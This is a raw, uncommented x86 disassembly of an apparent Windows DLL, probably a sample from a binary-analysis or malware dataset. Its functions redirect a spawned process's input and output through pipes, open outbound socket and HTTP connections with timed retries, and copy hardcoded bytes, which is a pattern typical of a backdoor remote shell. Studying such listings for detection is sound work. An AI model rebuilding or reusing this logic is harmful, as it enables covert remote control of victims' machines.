mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_100054f0
push ebp
mov ebp esp
sub esp 0x8
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x4
push ebx
mov ebx [ edi + 0x10 ]
push esi
push 0x1
push ebx
call sub_100091bb
add esp 0x8
cmp [ edi + 0x14 ] 0x10
mov esi eax
mov [ ebp + 0x8 ] esi
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
pop esi
pop ebx
jb r-xdata
push 0x10
call sub_10008d9c
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
push ebx
push eax
push esi
call sub_1000a7c0
add esp 0xc
test esi esi
je r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
push edi
mov [ edi ] 0x0
call sub_10008d40
add esp 0x4
mov eax [ edi ]
push eax
call sub_10008d40
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x4 ]
mov eax [ edx + 0xc ]
add ecx 0xfffffffc
mov [ ebp - 0x8 ] esi
call eax
mov [ esi ] ax
mov [ esi + 0x2 ] 0x0
mov [ esi + 0x4 ] 0xd
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov ecx 0xffff
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax ] cx
mov [ eax + 0x2 ] 0xff
mov esi eax
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
add eax 0x24
call sub_10005630
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ebx
sub_100055d0
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push esi
lea esi [ eax + 0x1 ]
mov eax edi
call sub_100021f0
test al al
je r-xdata
push r--data
call sub_10008aad
mov eax edi
pop esi
retn
mov ecx [ edi + 0x10 ]
mov edx 0x10
cmp [ edi + 0x14 ] edx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
mov eax edi
pop esi
retn
mov [ eax + ecx ] 0xa
mov [ edi + 0x10 ] esi
cmp [ edi + 0x14 ] edx
jb r-xdata
sub_10005630
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
add ecx eax
push edi
test cl 0x3
jne r-xdata
mov edi [ ebx + 0xc ]
add edi [ ebx + 0x10 ]
mov eax [ ebx + 0x8 ]
push esi
mov esi edi
shr esi 0x2
cmp eax esi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ ebx + 0x8 ] eax
ja r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx + esi * 4 ] 0x0
jne r-xdata
sub esi eax
call sub_10005700
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + esi * 4 ]
and edi 0x3
lea edi [ edx + edi * 4 ]
pop esi
test edi edi
je r-xdata
push 0x10
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
inc [ ebx + 0x10 ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi ] ecx
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008c8d
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10009ef4
int3
mov ecx [ ebx + 0x4 ]
mov [ ecx + esi * 4 ] eax
sub_10005700
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
sub eax ecx
mov [ ebp - 0x8 ] 0x1
cmp eax 0x1
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_10008aad
cmp eax 0x1
jbe r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0x8 ]
push esi
push edi
mov edi [ ebx + 0xc ]
xor esi esi
shr edi 0x2
add eax ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
cmp eax esi
jbe r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
add eax eax
add eax eax
lea esi [ edi * 4 ]
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ esi + edx ]
push eax
call sub_10008e20
mov edx [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp edi edx
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp - 0x8 ] eax
lea edi [ edx * 4 ]
mov edx edi
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_10008e20
mov eax [ ebx + 0x4 ]
lea ecx [ edi + eax ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_10008e20
mov ecx [ ebp - 0x8 ]
add esp 0x18
lea edi [ esi + eax ]
test ecx ecx
je r-xdata
sar esi 0x2
mov [ ebp - 0xc ] esi
mov esi edx
mov edx [ ebp - 0xc ]
add edx edx
add edx edx
push edx
push ecx
push eax
mov [ ebp - 0xc ] edx
call sub_10008e20
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi edi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] esi
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_10009ef4
int3
lea ecx [ eax * 4 ]
push ecx
call sub_10008d9c
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
mov eax [ ebx + 0x4 ]
pop edi
pop esi
test eax eax
je r-xdata
xor eax eax
[ edi ]
test edi edi
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add [ ebx + 0x8 ] edx
mov [ ebx + 0x4 ] ecx
mov esp ebp
pop ebp
retn
push eax
call sub_10008d40
add esp 0x4
mov ecx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
sub_10005890
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push 0x44
xor esi esi
lea eax [ ebp - 0x60 ]
push esi
push eax
call sub_1000a740
mov ebx [ GetCurrentProcess@IAT ]
add esp 0xc
xor eax eax
push esi
xor ecx ecx
push 0x1
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
push 0x2
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x34 ] 0x101
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edi
call ebx
push eax
push edi
call ebx
push eax
call [ DuplicateHandle@IAT ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0x1c ]
push edx
lea ecx [ ebp - 0x60 ]
push ecx
push esi
push esi
push esi
push 0x1
push esi
push esi
push esi
push eax
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
push 0x3
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0xc ] r--data
call sub_10008c05
push r--data
lea ecx [ ebp - 0xc ]
push ecx
call sub_10009ef4
int3
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x1c ]
push edx
call [ CloseHandle@IAT ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10005970
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push edi
xor eax eax
push 0x0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
push ecx
lea eax [ esi + 0x20 ]
push eax
lea edi [ esi + 0x24 ]
push edi
mov [ ebp - 0x14 ] 0xc
mov [ ebp - 0xc ] 0x1
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
lea ebx [ esi + 0x28 ]
lea eax [ esi + 0x2c ]
push ebx
push eax
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x1
lea edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10008c05
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10009ef4
mov ecx [ edi ]
mov edi [ ebx ]
push ecx
push esi
call sub_10005890
mov edi [ CreateThread@IAT ]
lea edx [ esi + 0x30 ]
push edx
push 0x0
push esi
push sub_10005bb0
mov [ esi + 0x1c ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
call edi
mov [ esi + 0x34 ] eax
test eax eax
jne r-xdata
push 0x2
lea edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10008c05
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10009ef4
lea eax [ esi + 0x3c ]
push eax
push 0x0
push esi
push sub_10005ca0
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
call edi
mov [ esi + 0x38 ] eax
test eax eax
jne r-xdata
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10008c05
push r--data
lea edx [ ebp - 0x2c ]
push edx
call sub_10009ef4
mov ecx [ esi + 0x34 ]
mov edx [ esi + 0x1c ]
push 0xffffffff
mov [ ebp - 0x1c ] eax
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x3
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] edx
call [ WaitForMultipleObjects@IAT ]
sub eax 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
push 0x5
lea edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] r--data
call sub_10008c05
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10009ef4
mov eax [ esi + 0x38 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
call [ GetExitCodeThread@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x38 ]
push ecx
push edx
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x1c ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call [ GetExitCodeProcess@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x1c ]
push edx
push eax
dec eax
je r-xdata
mov ecx [ esi + 0x34 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
call [ GetExitCodeThread@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
push edx
push eax
call [ TerminateThread@IAT ]
mov edx [ esi + 0x1c ]
lea ecx [ ebp - 0x4 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x1c ]
push eax
push ecx
jmp r-xdata
dec eax
jne r-xdata
call [ TerminateProcess@IAT ]
mov ecx [ esi + 0x20 ]
mov ebx [ DisconnectNamedPipe@IAT ]
push ecx
call ebx
mov edx [ esi + 0x20 ]
mov edi [ CloseHandle@IAT ]
push edx
call edi
mov eax [ esi + 0x2c ]
push eax
call ebx
mov ecx [ esi + 0x2c ]
push ecx
call edi
mov edx [ esi + 0x34 ]
push edx
call edi
mov eax [ esi + 0x38 ]
push eax
call edi
mov ecx [ esi + 0x1c ]
push ecx
call edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x38 ]
mov edi [ GetExitCodeThread@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push edx
call edi
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x38 ]
mov ebx [ TerminateThread@IAT ]
push eax
push ecx
call ebx
mov eax [ esi + 0x34 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
call edi
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
push ecx
push edx
call ebx
jmp r-xdata
sub_10005bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011c20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov ecx [ edi + 0x40 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
mov esi eax
cmp esi ebx
je r-xdata
push 0x6
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp + 0x8 ] r--data
call sub_10008c05
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10009ef4
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ esi + 0x10 ]
cmp edx ebx
jbe r-xdata
cmp [ edi + 0x40 ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push eax
call [ ExitThread@IAT ]
mov eax [ edi + 0x20 ]
push ebx
lea ebx [ ebp - 0x14 ]
push ebx
push edx
push ecx
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_10008d40
add esp 0x4
mov ecx [ esi ]
push ecx
call sub_10008d40
add esp 0x4
sub_10005ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011cde
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0x400
lea eax [ ebp - 0x410 ]
push 0x0
push eax
mov [ ebp - 0x83c ] esi
call sub_1000a740
push 0x41e
lea ecx [ ebp - 0x830 ]
push 0x0
push ecx
call sub_1000a740
mov esi [ esi + 0x2c ]
add esp 0x18
push 0x0
push 0x0
lea edx [ ebp - 0x834 ]
push edx
push 0x400
lea eax [ ebp - 0x410 ]
push eax
push esi
mov [ ebp - 0x838 ] esi
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x6d
je r-xdata
nop
push 0x0
call [ ExitThread@IAT ]
push 0x8
lea eax [ ebp - 0x83c ]
push eax
lea ecx [ ebp - 0x858 ]
mov [ ebp - 0x83c ] r--data
call sub_10008c05
push r--data
lea ecx [ ebp - 0x858 ]
push ecx
call sub_10009ef4
push 0x32
call [ Sleep@IAT ]
push 0x400
lea ecx [ ebp - 0x410 ]
push 0x0
push ecx
call sub_1000a740
add esp 0xc
push 0x0
lea edx [ ebp - 0x834 ]
push edx
push 0x400
lea eax [ ebp - 0x410 ]
push eax
push esi
call [ ReadFile@IAT ]
mov edx [ ebp - 0x834 ]
xor esi esi
test edx edx
je r-xdata
xor bl bl
cmp [ ebp - 0x834 ] 0x0
jbe r-xdata
push 0x1c
call sub_10008d9c
mov edi eax
add esp 0x4
mov [ ebp - 0x840 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x830 ]
xor edi edi
lea eax [ ebp - 0x830 ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
lea edx [ eax + 0x1 ]
mov [ eax ] cl
inc esi
inc eax
mov bl cl
cmp esi edx
jb r-xdata
cmp bl 0xd
je r-xdata
push 0x7
lea ecx [ ebp - 0x838 ]
push ecx
lea ecx [ ebp - 0x84c ]
mov [ ebp - 0x838 ] r--data
call sub_10008c05
push r--data
lea edx [ ebp - 0x84c ]
push edx
call sub_10009ef4
mov ecx [ eax + 0x40 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
push 0x41e
lea ecx [ ebp - 0x830 ]
push ebx
push ecx
call sub_1000a740
mov esi [ ebp - 0x838 ]
add esp 0xc
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
lea eax [ ebp - 0x830 ]
mov ecx edi
call sub_10002000
jmp r-xdata
mov cl [ ebp + esi - 0x410 ]
cmp cl 0xa
jne r-xdata
mov [ eax ] 0xd
inc eax
push 0x0
push 0x0
lea edx [ ebp - 0x834 ]
push edx
push 0x400
lea eax [ ebp - 0x410 ]
push eax
push esi
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x83c ]
cmp [ eax + 0x40 ] ebx
je r-xdata
sub_10005ef0
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x18 ] ebx
lea edi [ esi + 0x44 ]
push 0x8
mov [ edi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x3c ] ebx
call sub_10008c8d
push r--data
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x48 ] r--data
call sub_10009ef4
int3
mov [ edi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ edi ]
mov [ eax ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov ecx 0xdbba0
mov eax 0x2
push 0x1
push 0x36
mov [ esi + 0x38 ] ecx
mov [ esi + 0x40 ] 0x3e8
mov [ esi + 0x3c ] eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x2c ] 0x36
mov [ esi + 0x1c ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x10 ] r--data
mov [ ebp - 0x38 ] 0xf73c63b
mov [ ebp - 0x34 ] 0xc085078b
mov [ ebp - 0x30 ] 0xd0ff0274
mov [ ebp - 0x2c ] 0x3b04c783
mov [ ebp - 0x28 ] 0x5ff172fe
mov [ ebp - 0x24 ] 0xff8bc35e
mov [ ebp - 0x20 ] 0x78d8b856
mov [ ebp - 0x1c ] 0xe8500775
mov [ ebp - 0x18 ] 0xffffd1b1
mov [ ebp - 0x14 ] 0x8bc35d59
mov [ ebp - 0x10 ] 0xec8b55ff
mov [ ebp - 0xc ] 0xa110ec83
mov [ ebp - 0x8 ] 0x3533
call sub_100091bb
push 0x32
lea ecx [ ebp - 0x38 ]
push ecx
push 0x32
push eax
mov [ esi + 0x28 ] eax
call sub_10009225
mov ecx [ ebp - 0x4 ]
add esp 0x18
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10008bf6
mov esp ebp
pop ebp
retn
sub_10006050
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1b4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1b0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea ecx [ esp + 0x28 ]
push ecx
push 0x202
mov [ esp + 0x18 ] eax
call [ WSAStartup@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov esi eax
lea eax [ esi + 0x1 ]
push 0x1
push eax
call sub_100091bb
add esp 0x8
push 0x0
push 0x0
push esi
mov edi eax
push edi
lea ecx [ esi + esi ]
push ecx
push ebx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
push edi
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push 0x50
mov [ esp + 0x20 ] eax
call [ htons@IAT ]
mov esi [ esp + 0x14 ]
push 0x10
lea ecx [ esp + 0x1c ]
push ecx
push esi
mov [ esp + 0x26 ] ax
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov esi [ eax ]
push edi
call sub_10009181
add esp 0x4
mov eax esi
push esi
call [ closesocket@IAT ]
call [ WSACleanup@IAT ]
movzx eax [ esp + 0xf ]
mov ecx [ esp + 0x1bc ]
imul eax eax 0x64
pop edi
pop esi
pop ebx
xor ecx esp
lea eax [ eax + rw-data ]
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
mov al [ esp + 0xf ]
inc al
mov [ esp + 0xf ] al
cmp al 0x3
jb r-xdata
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
movzx ebx [ esp + 0xf ]
imul ebx ebx 0x64
mov edx 0x2
lea ebx [ ebx + rw-data ]
mov [ esp + 0x14 ] eax
mov eax ebx
mov [ esp + 0x18 ] dx
lea edx [ eax + 0x2 ]
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x14 ]
push eax
call [ Sleep@IAT ]
jmp r-xdata
mov [ esp + 0xf ] 0x0
sub_10006190
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
mov esi ecx
push esi
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_10006050
mov edi [ CreateThread@IAT ]
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push esi
push sub_10006030
push 0x0
push 0x0
call edi
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
push esi
push sub_10006040
push 0x0
push 0x0
call edi
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] r--data
call sub_10008c8d
push r--data
lea edx [ ebp - 0x20 ]
push edx
call sub_10009ef4
push 0xffffffff
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
mov ecx [ ebp - 0x14 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ ebp - 0x10 ]
push edx
call esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] r--data
call sub_10008c8d
push r--data
lea edx [ ebp - 0x20 ]
push edx
call sub_10009ef4
sub_10006260
push ebp
mov ebp esp
sub esp 0x10
cmp [ ecx + 0x54 ] 0x0
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
push esi
push edi
lea edi [ ecx + 0x44 ]
lea eax [ ebp - 0x10 ]
mov ecx edi
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
push ebx
mov ebx [ eax + ecx * 4 ]
mov esi [ ebx + 0x4 ]
push 0x1
push esi
call sub_100091bb
mov ecx [ ebx ]
push esi
push ecx
push esi
push eax
mov [ ebp - 0x4 ] eax
call sub_10009225
mov eax [ edi + 0x10 ]
add esp 0x18
test eax eax
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov edx [ edi + 0x8 ]
inc [ edi + 0xc ]
add edx edx
add edx edx
cmp edx [ edi + 0xc ]
ja r-xdata
push ebx
call sub_10008d40
push 0x8
call sub_10008d9c
add esp 0x8
pop ebx
test eax eax
je r-xdata
push eax
call sub_10009181
add esp 0x4
dec eax
mov [ edi + 0x10 ] eax
jne r-xdata
mov [ edi + 0xc ] 0x0
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
mov [ eax + 0x4 ] esi
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ edi + 0xc ] 0x0
sub_10006330
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
mov edi ecx
test eax eax
je r-xdata
pop edi
pop ebp
retn 0x4
cmp [ edi + 0xc ] 0x0
mov [ edi + 0x4 ] 0x0
jne r-xdata
cmp [ edi + 0x18 ] 0x0
push ebx
lea ebx [ edi + 0x18 ]
mov [ edi + 0xc ] eax
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
pop ebx
push esi
push 0x1
push 0x4
call sub_100091bb
mov esi eax
add esp 0x8
test esi esi
je r-xdata
or eax 0xffffffff
mov eax [ eax ]
jmp r-xdata
pop esi
push 0x4
push ebx
push 0x4
push esi
call sub_10009225
push 0x8
call sub_10008d9c
add esp 0x14
test eax eax
je r-xdata
mov [ ebx ] eax
xor eax eax
mov [ edi + 0x8 ] eax
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] 0x4
pop ebx
mov [ edi + 0x8 ] eax
pop edi
pop ebp
retn 0x4
sub_100063d0
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
push 0x1
push 0x7
call sub_100091bb
push 0x0
mov edi eax
call sub_10009737
mov esi eax
mov [ ebp - 0x4 ] edx
call sub_10009867
cdq
mov ecx 0x989680
idiv ecx
add edx esi
push edx
call sub_10009855
add esp 0x10
xor esi esi
lea esp [ esp ]
cmp edx 0x41
jl r-xdata
cmp edx 0x39
jle r-xdata
cmp edx 0x61
jl r-xdata
cmp edx 0x5a
jle r-xdata
mov [ esi + edi ] dl
inc esi
cmp esi 0x7
jl r-xdata
call sub_10009867
cdq
mov ecx 0x5d
idiv ecx
add edx 0x21
cmp edx 0x30
jl r-xdata
cmp edx 0x7a
jg r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10006450
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
push eax
call [ Sleep@IAT ]
mov ecx [ ebx + 0x8 ]
push ecx
push ebx
call sub_10006b10
mov esi eax
mov eax [ ebx + 0x10 ]
lea edx [ eax + 0x2 ]
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edi [ esi + 0x4 ]
sub eax edx
sar eax 0x1
lea edx [ edi + eax + 0x2 ]
push 0x2
push edx
call sub_100091bb
push 0x2
push edi
mov [ ebp - 0xc ] eax
call sub_100091bb
add esp 0x10
mov edi eax
mov eax [ esi + 0x4 ]
push eax
push edi
push eax
mov eax [ esi ]
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov ecx [ ebx + 0x10 ]
mov eax ecx
lea edx [ eax + 0x2 ]
nop
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov bx [ eax ]
add eax 0x2
test bx bx
jne r-xdata
mov ebx [ ebp - 0xc ]
sub eax edx
sar eax 0x1
push eax
push ecx
push ebx
call sub_10009be4
mov ecx [ esi + 0x4 ]
push ecx
push edi
push ebx
call sub_10009be4
push edi
call sub_10009181
mov eax [ esi ]
add esp 0x1c
test eax eax
je r-xdata
push esi
call sub_10008d40
add esp 0x4
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
call [ InternetOpenW@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
push eax
call sub_10009181
add esp 0x4
mov ebx [ ebp + 0x8 ]
mov edx [ ebx + 0x34 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x50
push edx
push eax
call [ InternetConnectW@IAT ]
mov [ ebp - 0x1c ] eax
test eax eax
jne r-xdata
push ebx
call sub_10009181
mov ebx [ ebp + 0x8 ]
add esp 0x4
jmp r-xdata
mov edi [ ebp - 0xc ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edi
push r--data
push eax
call [ HttpOpenRequestW@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_10009181
add esp 0x4
jmp r-xdata
mov edi [ HttpAddRequestHeadersW@IAT ]
push 0x20000000
push 0xffffffff
push r--data
push esi
call edi
push 0x20000000
push 0xffffffff
push r--data
push esi
